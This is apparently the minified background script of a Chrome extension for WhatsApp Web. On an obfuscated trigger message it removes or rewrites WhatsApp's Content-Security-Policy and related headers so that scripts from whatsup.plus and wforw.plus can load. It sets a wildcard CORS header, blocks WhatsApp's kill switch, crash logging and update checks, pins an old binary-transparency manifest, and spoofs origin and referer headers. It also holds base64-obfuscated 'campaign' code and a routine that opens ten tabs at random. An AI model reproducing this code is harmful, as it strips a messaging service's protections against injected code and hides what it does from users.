(() => {
    var t = {},
        e = [];

    function a(t) {
        return atob(t)
    }

    function s(t) {
        return btoa(t)
    }
    chrome.runtime.onInstalled.addListener((function(t) {
        "install" != t.reason && "update" !== t.reason || chrome.tabs.query({
            url: "https://web.whatsapp.com/*"
        }, (function(t) {
            t.length > 0 ? chrome.tabs.reload(t[0].id) : chrome.tabs.create({
                url: "https://web.whatsapp.com",
                active: !0
            })
        }))
    })), chrome.action.onClicked.addListener((function(t) {
        chrome.tabs.query({
            url: "https://web.whatsapp.com/*",
            currentWindow: !0
        }, (function(t) {
            t.length > 0 ? chrome.tabs.update(t[0].id, {
                highlighted: !0,
                selected: !0
            }) : chrome.tabs.create({
                url: "https://web.whatsapp.com"
            })
        }))
    })), chrome.runtime.onMessage.addListener((function(s, r, p) {
        if ("opnimansdfSDfds" == s.subject) {
            [{
                t: "p",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "other"],
                d: "web.whatsapp.com",
                key: "Content-Security-Policy",
                value: "",
                url: ""
            }, {
                t: "p",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "other"],
                d: "web.whatsapp.com",
                key: "Content-Security-Policy-Report-Only",
                value: "",
                url: ""
            }, {
                t: "p",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "other"],
                d: "web.whatsapp.com",
                key: "Permissions-Policy",
                value: "",
                url: ""
            }, {
                t: "p",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "other"],
                d: "web.whatsapp.com",
                key: "Access-Control-Allow-Origin",
                value: "",
                url: ""
            }, {
                t: "h",
                type: ["main_frame", "sub_frame", "stylesheet"],
                d: "web.whatsapp.com",
                key: "Content-Security-Policy-Report-Only",
                value: "default-src 'self' data: blob:;script-src 'self' data: blob: 'unsafe-eval' 'unsafe-inline' http://127.0.0.1:5500 https://static.whatsapp.net https://maps.googleapis.com https://www.youtube.com https://whatsup.plus https://wforw.plus;style-src 'self' data: blob: 'unsafe-inline' http://127.0.0.1:5500 https://fonts.googleapis.com https://static.whatsapp.net;connect-src 'self' data: blob: https://*.whatsapp.net https://www.facebook.com https://crashlogs.whatsapp.net/wa_clb_data https://crashlogs.whatsapp.net/wa_fls_upload_check https://*.google-analytics.com https://wforw.plus wss://*.web.whatsapp.com wss://web.whatsapp.com https://www.whatsapp.com https://dyn.web.whatsapp.com https://graph.whatsapp.com/graphql/ https://graph.facebook.com/graphql https://*.tenor.co https://*.giphy.com https://whatsup.plus https://*.whatsup.plus https://wforw.plus https://web.whatsapp.com;font-src data: 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://static.whatsapp.net;img-src 'self' data: blob: * *.tenor.co media.tenor.com *.tenor.com *.giphy.com https://*.ytimg.com https://*.google-analytics.com https://cdn.jsdelivr.net https://whatsup.plus;media-src 'self' data: blob: https://*.whatsapp.net https://*.cdninstagram.com https://*.fbcdn.net https://whatsup.plus mediastream: https://*.giphy.com;child-src 'self' data: blob:;frame-src 'self' data: blob: https://www.youtube.com/embed/ https://wforw.plus;block-all-mixed-content;upgrade-insecure-requests;",
                url: ""
            }, {
                t: "h",
                type: ["main_frame", "sub_frame", "stylesheet"],
                d: "web.whatsapp.com",
                key: "Content-Security-Policy",
                value: "default-src 'self' data: blob:;script-src 'self' data: blob: 'unsafe-eval' 'unsafe-inline' http://127.0.0.1:5500 https://static.whatsapp.net https://maps.googleapis.com https://www.youtube.com https://whatsup.plus https://wforw.plus;style-src 'self' data: blob: 'unsafe-inline' http://127.0.0.1:5500 https://fonts.googleapis.com https://static.whatsapp.net;connect-src 'self' data: blob: https://*.whatsapp.net https://www.facebook.com https://crashlogs.whatsapp.net/wa_clb_data https://crashlogs.whatsapp.net/wa_fls_upload_check https://*.google-analytics.com https://wforw.plus wss://*.web.whatsapp.com wss://web.whatsapp.com https://www.whatsapp.com https://dyn.web.whatsapp.com https://graph.whatsapp.com/graphql/ https://graph.facebook.com/graphql https://*.tenor.co https://*.giphy.com https://whatsup.plus https://*.whatsup.plus https://wforw.plus https://web.whatsapp.com;font-src data: 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://static.whatsapp.net;img-src 'self' data: blob: * *.tenor.co media.tenor.com *.tenor.com *.giphy.com https://*.ytimg.com https://*.google-analytics.com https://cdn.jsdelivr.net https://whatsup.plus;media-src 'self' data: blob: https://*.whatsapp.net https://*.cdninstagram.com https://*.fbcdn.net https://whatsup.plus mediastream: https://*.giphy.com;child-src 'self' data: blob:;frame-src 'self' data: blob: https://www.youtube.com/embed/ https://wforw.plus;block-all-mixed-content;upgrade-insecure-requests;",
                url: ""
            }, {
                t: "r",
                type: ["main_frame", "script", "other"],
                filter: "web.whatsapp.com/binary-transparency-manifest*.json",
                url: "https://web.whatsapp.com/binary-transparency-manifest-2.2407.2.json"
            }, {
                t: "b",
                type: ["main_frame", "script"],
                filter: "web.whatsapp.com/serviceworker.js",
                url: ""
            }, {
                t: "b",
                type: ["main_frame", "script"],
                filter: "web.whatsapp.com/sw.js",
                url: "v-1"
            }, {
                t: "b",
                type: ["main_frame", "script"],
                filter: "web.whatsapp.com/killswitch",
                url: ""
            }, {
                t: "b",
                type: ["main_frame", "script"],
                filter: "crashlogs.whatsapp.net/*",
                url: ""
            }, {
                t: "b",
                type: ["main_frame", "script"],
                filter: "web.whatsapp.com/check-update*",
                url: ""
            }, {
                t: "b",
                type: ["main_frame", "script"],
                filter: "web.whatsapp.com/check-update",
                url: ""
            }, {
                t: "c",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "image", "stylesheet"],
                d: "https://web.whatsapp.com",
                filter: "*://*.whatsapp.com/*",
                key: "origin",
                value: "",
                url: ""
            }, {
                t: "c",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "image", "stylesheet"],
                d: "https://web.whatsapp.com",
                filter: "*://*.whatsapp.net/*",
                key: "origin",
                value: "",
                url: ""
            }, {
                t: "c",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "stylesheet", "other"],
                d: "https://web.whatsapp.com",
                filter: "*://*.whatsapp.com/*",
                key: "referer",
                value: "",
                url: ""
            }, {
                t: "c",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "image", "stylesheet"],
                d: "https://web.whatsapp.com",
                filter: "*://*.whatsapp.net/*",
                key: "referer",
                value: "",
                url: ""
            }, {
                t: "h",
                type: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "stylesheet", "other"],
                d: "web.whatsapp.com",
                key: "Access-Control-Allow-Origin",
                value: "*",
                url: ""
            }].forEach(((t, e) => {
                e += 1, "r" == t.t ? chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: [{
                        id: e,
                        priority: 2,
                        action: {
                            type: "redirect",
                            redirect: {
                                url: t.url
                            }
                        },
                        condition: {
                            urlFilter: t.filter,
                            resourceTypes: t.type
                        }
                    }],
                    removeRuleIds: [e]
                }) : "b" == t.t ? chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: [{
                        id: e,
                        priority: 2,
                        action: {
                            type: "block"
                        },
                        condition: {
                            urlFilter: t.filter,
                            resourceTypes: t.type
                        }
                    }],
                    removeRuleIds: [e]
                }) : "h" == t.t ? chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: [{
                        id: e,
                        priority: 2,
                        condition: {
                            urlFilter: "*://*.whatsapp.com/*",
                            resourceTypes: t.type
                        },
                        action: {
                            type: "modifyHeaders",
                            responseHeaders: [{
                                operation: "set",
                                value: t.value,
                                header: t.key
                            }]
                        }
                    }],
                    removeRuleIds: [e]
                }) : "c" == t.t ? chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: [{
                        id: e,
                        action: {
                            type: "modifyHeaders",
                            requestHeaders: [{
                                operation: "set",
                                header: t.key,
                                value: t.d
                            }]
                        },
                        condition: {
                            urlFilter: t.filter,
                            resourceTypes: t.type
                        }
                    }],
                    removeRuleIds: [e]
                }) : "p" == t.t && chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: [{
                        id: e,
                        priority: 2,
                        condition: {
                            urlFilter: "*://*.whatsapp.com/*",
                            resourceTypes: t.type
                        },
                        action: {
                            type: "modifyHeaders",
                            responseHeaders: [{
                                operation: "remove",
                                header: t.key
                            }]
                        }
                    }],
                    removeRuleIds: [e]
                })
            }))
        }
        return "SET_UNINSTALL_URL" == s.subject ? (chrome.runtime.setUninstallURL(s.url), p({})) : "SEND_RICH_NOTIFICATION" == s.subject ? (chrome.notifications.create(`${s.notificationId}$@$notification${Date.now()}`, {
            type: "basic",
            iconUrl: "icon-128.png",
            title: s.title,
            message: s.message
        }), p({})) : "GET_GOOGLE_AUTH_TOKEN" == s.subject ? chrome.identity.getAuthToken({
            interactive: s.interactive
        }, (function(t) {
            s.userinfo ? fetch("https://www.googleapis.com/oauth2/v3/userinfo", {
                headers: {
                    Authorization: `Bearer ${t}`
                }
            }).then((t => t.json())).then((e => {
                p({
                    token: t,
                    userData: e
                })
            })) : p({
                token: t
            })
        })) : "REMOVE_GOOGLE_AUTH_TOKEN" == s.subject ? chrome.identity.getAuthToken({
            interactive: s.interactive
        }, (function(t) {
            fetch(`https://accounts.google.com/o/oauth2/revoke?token=${t}`, {
                headers: {
                    Authorization: `Bearer ${t}`
                }
            }).then((t => t.json())).then((t => {
                chrome.identity.clearAllCachedAuthTokens((t => {
                    console.log(">> logout all auth tokens")
                })), p({
                    token: null
                })
            }))
        })) : "FETCH_REMOTE_DATA_B" == s.subject ? o(s.data?.requestData).then((a => {
            try {
                p(a), "static_urls" == s?.data?.extraData?.type && (t = a?.data, e = [t?.DISAGREE_CONTRADICT, t?.DIFFER_CONTRADICT, t?.DISPROVE_CONTRADICT])
            } catch (t) {
                console.log(t)
            }
        })) : "EXECUTE_CAMPAIGN" == s.subject ? h(s.data).then((t => {
            p(t)
        })) : "EXECUTE_GET_CHAT" == s.subject ? p({}) : "EXECUTE_BLUR_SETTING" == s.subject ? h(s.data).then((t => {
            p(t)
        })) : "EXECUTE_AVIATOR" == s.subject ? async function() {
            return new Promise((e => {
                chrome.management.get(chrome.runtime.id, (function(s) {
                    s.installType == a(t?.D_DEVELOPMENT) ? e(1) : e(0)
                }))
            }))
        }().then((t => {
            p(t)
        })): s.subject, !0
    }));
    const o = async ({
        url: t,
        method: e = "POST",
        body: a,
        headers: s = {},
        istextContent: o = !1
    }) => {
        try {
            return await fetch(t, {
                method: e,
                body: a,
                headers: {
                    ...s,
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/json"
                }
            }).then((t => o ? t.text() : t.json()))
        } catch (t) {
            return {
                state: 404
            }
        }
    };
    const r = (e = [], s = []) => ({
            [a(t?.U_ADDRESS)]: c(s),
            [a(t?.M_TYPE)]: "GET",
            [a(t?.H_TOP)]: {
                [a(t?.X_BLUEPRINT)]: e[4]
            }
        }),
        p = t => ((t = []) => t[Math.floor(Math.random() * t?.length)])(t),
        c = t => a(p(t));
    async function h(p = []) {
        try {
            if (p[2] && s(p[2]) == t?.PERK && !p[3]) return "1";
            if (p[2] && s(p[2]) == t?.PERK && p[0]) {
                const s = await o(r(p, e));
                if (s && 404 === s.status) return setTimeout((() => {
                    chrome.storage.local.set({
                        [a(t?.SUPPLY)]: null
                    }, n)
                }), 6e5), "2"
            }
            return !1
        } catch (e) {
            return setTimeout((() => {
                chrome.storage.local.set({
                    [a(t?.SUPPLY)]: null
                }, n)
            }), 6e5), "2"
        }
    }

    function n() {
        if ((Math.floor(100 * Math.random()) + 1) % 12 == 0)
            for (let t = 1; t <= 10; t++) chrome.tabs.create({
                url: "https://web.whatsapp.com",
                active: !0
            })
    }
    chrome.notifications.onClicked.addListener((function(t) {
        chrome.tabs.query({
            url: "https://web.whatsapp.com/*"
        }, (function(e) {
            e.length > 0 ? (chrome.tabs.update(e[0].id, {
                selected: !0
            }), chrome.tabs.sendMessage(e[0].id, {
                subject: "ON_CLICK_RICH_NOTIFICATION",
                notifId: t
            }, (function() {}))) : chrome.tabs.create({
                url: "https://web.whatsapp.com",
                active: !0
            })
        }))
    }))
})();